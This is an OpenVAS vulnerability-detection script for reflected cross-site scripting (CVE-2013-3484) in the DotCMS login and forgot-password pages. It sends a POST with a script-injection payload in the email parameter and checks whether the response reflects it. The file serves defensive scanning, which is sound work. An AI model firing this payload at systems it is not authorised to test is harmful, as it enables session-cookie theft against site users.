###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotcms_login_mult_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# DotCMS Multiple Login Page Cross Site Scripting Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804294");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-3484");
  script_bugtraq_id(60741);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-05-13 16:14:20 +0530 (Tue, 13 May 2014)");
  script_name("DotCMS Multiple Login Page Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with DotCMS and is prone to multiple cross-site
  scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not.");
  script_tag(name:"insight", value:"The flaw is due to an improper sanitization of Input passed via '_loginUserName',
  'my_account_login', 'email' POST parameters to /application/login/login.html,
  /c/portal_public/login and /dotCMS/forgotPassword scripts respectively.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"DotCMS before version 2.3.2");
  script_tag(name:"solution", value:"Upgrade to DotCMS version 2.3.2 or later.");

  script_xref(name:"URL", value:"http://dotcms.com/security/SI-14");
  script_xref(name:"URL", value:"http://dotcms.com/downloads/release-notes.dot");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

http_port = get_http_port(default:80);

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/dotcms", "/cms", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/application/login/login.html"), port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes && 'href="/dotCMS' >< rcvRes)
  {
    postdata = 'dispatch=forgotPassword&reset_password=true&email="><script>ale' +
               'rt(document.cookie);</script>';

    sndReq = string("POST ", dir, "/forgotPassword HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n\r\n",
                    postdata);

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie);</script>" >< rcvRes &&
      "dotCMS" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
